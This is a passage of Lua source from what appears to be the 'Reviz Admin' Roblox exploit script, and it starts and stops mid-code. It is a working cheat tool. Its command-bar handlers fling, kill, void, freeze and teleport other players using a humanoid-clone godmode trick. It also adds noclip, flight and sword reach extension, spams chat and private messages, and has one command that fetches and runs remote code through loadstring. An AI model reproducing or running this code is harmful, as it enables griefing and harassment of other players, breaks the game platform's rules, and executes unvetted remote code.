                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spin ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                spinplr = v
                wait(0.5)
                spin = true
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspin") then
            spin = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("attach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                attplr = v
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unattach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                getout(lplayer, game:GetService("Players")[v.Name])
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("follow ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                followed = true
                flwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unfollow") then
            followed = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("freefall ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("trail ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                traill = true
                trlplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("untrail") then
            traill = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("orbit ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local o = Instance.new("RocketPropulsion")
                    o.Parent = lplayer.Character.HumanoidRootPart
                    o.Name = "Orbit"
                    o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    o:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unorbit") then
            lplayer.Character.HumanoidRootPart.Orbit:Destroy()
            noclip = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fling ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local y = Instance.new("RocketPropulsion")
                    y.Parent = lplayer.Character.HumanoidRootPart
                    y.CartoonFactor = 1
                    y.MaxThrust = 800000
                    y.MaxSpeed = 1000
                    y.ThrustP = 200000
                    y.Name = "Fling"
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                    y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    y:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unfling") then
            noclip = false
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            wait(0.4)
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("fecheck") then
            if game:GetService("Workspace").FilteringEnabled == true then
                warn("FE is Enabled (Filtering Enabled)")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Enabled";
                    Text = "Filtering Enabled. Enjoy using Reviz Admin!";
                })
            else
                warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Disabled";
                    Text = "Filtering Disabled. Consider using a different admin script.";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("void ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("noclip") then
            noclip = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip enabled";
            Text = "Type ;clip to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("clip") then
            noclip = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip disabled";
            Text = "Type ;noclip to enable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("speed ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 7))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hipheight ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("jumppower ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("default") then
            lplayer.Character.Humanoid.JumpPower = 50
            lplayer.Character.Humanoid.WalkSpeed = 16
            lplayer.Character.Humanoid.HipHeight = 0
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("annoy ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                annoying = true
                annplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unannoy") then
            annoying = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("headwalk ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                hwalk = true
                hdwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("unheadwalk") then
            hwalk = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("nolimbs") then
            lplayer.Character["Left Leg"]:Destroy()
            lplayer.Character["Left Arm"]:Destroy()
            lplayer.Character["Right Leg"]:Destroy()
            lplayer.Character["Right Arm"]:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("god") then
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FE Godmode enabled";
            Text = "Use ;grespawn or ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("drophats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("droptool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdhats") then
            droppinghats = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdhats to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdhats") then
            droppinghats = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdhats to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdtool") then
            droppingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdtool to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdtool") then
            droppingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdtool to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("invisible") then -- Credit to Timeless
            Local = game:GetService('Players').LocalPlayer
            Char  = Local.Character
            touched,tpdback = false, false
            box = Instance.new('Part',workspace)
            box.Anchored = true
            box.CanCollide = true
            box.Size = Vector3.new(10,1,10)
            box.Position = Vector3.new(0,10000,0)
            box.Touched:connect(function(part)
                if (part.Parent.Name == Local.Name) then
                    if touched == false then
                        touched = true
                        function apply()
                            if script.Disabled ~= true then
                                no = Char.HumanoidRootPart:Clone()
                                wait(.25)
                                Char.HumanoidRootPart:Destroy()
                                no.Parent = Char
                                Char:MoveTo(loc)
                                touched = false
                            end end
                        if Char then
                            apply()
                        end
                    end
                end
            end)
            repeat wait() until Char
            loc = Char.HumanoidRootPart.Position
            Char:MoveTo(box.Position + Vector3.new(0,.5,0))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Invisibility enabled!";
            Text = "Reset or use ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("view ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                if game:GetService("Players")[v.Name].Character.Humanoid then
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
                else
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unview") then
            if lplayer.Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
        repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
        repeat wait() until Mouse
       
        local T = lplayer.Character.HumanoidRootPart
        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
        local SPEED = speedget
       
        local function fly()
            flying = true
            local BG = Instance.new('BodyGyro', T)
            local BV = Instance.new('BodyVelocity', T)
            BG.P = 9e4
            BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0.1, 0)
            BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
            spawn(function()
            repeat wait()
            lplayer.Character.Humanoid.PlatformStand = true
            if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
            SPEED = 50
            elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
            SPEED = 0
            end
            if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
            elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            else
            BV.velocity = Vector3.new(0, 0.1, 0)
            end
            BG.cframe = workspace.CurrentCamera.CoordinateFrame
                    until not flying
                    CONTROL = {F = 0, B = 0, L = 0, R = 0}
                    lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                    SPEED = 0
                    BG:destroy()
                    BV:destroy()
                    lplayer.Character.Humanoid.PlatformStand = false
                end)
            end
        Mouse.KeyDown:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = speedfly
            elseif KEY:lower() == 's' then
                CONTROL.B = -speedfly
            elseif KEY:lower() == 'a' then
                CONTROL.L = -speedfly
            elseif KEY:lower() == 'd' then
                CONTROL.R = speedfly
            end
        end)
        Mouse.KeyUp:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            end
        end)
        fly()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
            flying = false
            lplayer.Character.Humanoid.PlatformStand = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("chat ") then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(CMDBAR.Text, 6)), "All")
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spam ") then
            spamtext = (string.sub(CMDBAR.Text, 6))
            spamming = true
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspam") then
            spamming = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("spamwait ") then
            spamdelay = (string.sub(CMDBAR.Text, 10))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("pmspam ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                pmspammed = v.Name
                spammingpm = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpmspam") then
            spammingpm = false
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("cfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 9))) do
                v.Character["Left Leg"].Anchored = true
                v.Character["Left Arm"].Anchored = true
                v.Character["Right Leg"].Anchored = true
                v.Character["Right Arm"].Anchored = true
                v.Character.Torso.Anchored = true
                v.Character.Head.Anchored = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("uncfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 11))) do
                v.Character["Left Leg"].Anchored = false
                v.Character["Left Arm"].Anchored = false
                v.Character["Right Leg"].Anchored = false
                v.Character["Right Arm"].Anchored = false
                v.Character.Torso.Anchored = false
                v.Character.Head.Anchored = false
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unlockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = false
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = false
                        end
                    end
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Workspace unlocked. Use ;lockws to lock.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("lockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = true
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = true
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("btools") then
            local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
            Clone_T.BinType = "Clone"
            local Destruct = Instance.new("HopperBin",lplayer.Backpack)
            Destruct.BinType = "Hammer"
            local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
            Hold_T.BinType = "Grab"
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("pstand") then
            lplayer.Character.Humanoid.PlatformStand = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpstand") then
            lplayer.Character.Humanoid.PlatformStand = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhead") then
            lplayer.Character.Head.Mesh:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("sit") then
            lplayer.Character.Humanoid.Sit = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringobj ") then
            local function bringobjw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            obj.CanCollide = false
            obj.Transparency = 0.7
            wait()
            obj.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            while wait() do
                bringobjw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringObj";
            Text = "BringObj enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("wsvis ") then
            vis = (string.sub(CMDBAR.Text, 7))
            local a = game:GetService("Workspace"):GetDescendants()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Transparency = vis
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Transparency = vis
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hypertotal") then
            loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "HyperTotal GUI Loaded!";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
            CMDSFRAME.Visible = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshtool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blocktool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("spinner") then
            local p = Instance.new("RocketPropulsion")
            p.Parent = lplayer.Character.HumanoidRootPart
            p.Name = "Spinner"
            p.Target = lplayer.Character["Left Arm"]
            p:Fire()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Spinner enabled";
            Text = "Type ;nospinner to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("nospinner") then
            lplayer.Character.HumanoidRootPart.Spinner:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reachd") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,60)
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reach ") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Name = "Reach"
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(CMDBAR.Text, 7)))
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("noreach") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    v.Handle.Reach:Destroy()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach removed!";
            Text = "Removed reach from equipped sword.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("rkill ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("tp me ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("cbring ") then
            if (string.sub(CMDBAR.Text, 8)) == "all" or (string.sub(CMDBAR.Text, 8)) == "All" or (string.sub(CMDBAR.Text, 8)) == "ALL" then
                cbringall = true
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                    brplr = v.Name
                end
            end
            cbring = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncbring") then
            cbring = false
            cbringall = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("swap ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                tp(lplayer, game:GetService("Players")[v.Name])
                wait(0.4)
                lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("glitch ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.4)
                b = Instance.new("BodyForce")
                b.Parent = lplayer.Character.HumanoidRootPart
                b.Name = "Glitch"
                b.Force = Vector3.new(100000000,5000,0)
